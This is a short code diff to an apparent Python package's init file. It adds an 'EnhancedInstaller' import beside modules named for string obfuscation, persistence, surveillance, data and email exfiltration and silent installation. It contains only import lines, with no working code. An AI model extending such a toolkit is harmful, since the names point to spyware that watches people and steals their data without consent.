@@ -6,6 +6,7 @@ from .persistence import PersistenceManager
 from .surveillance import SurveillanceEngine
 from .communication import EmailExfiltrator, DataExfiltrator
 from .auto_installer import SilentInstaller
+from .enhanced_installer import EnhancedInstaller
 
 __all__ = [
     'StringObfuscator',
@@ -16,5 +17,6 @@ __all__ = [
     'SurveillanceEngine',
     'EmailExfiltrator',
     'DataExfiltrator',
-    'SilentInstaller'
+    'SilentInstaller',
+    'EnhancedInstaller'
 ] 
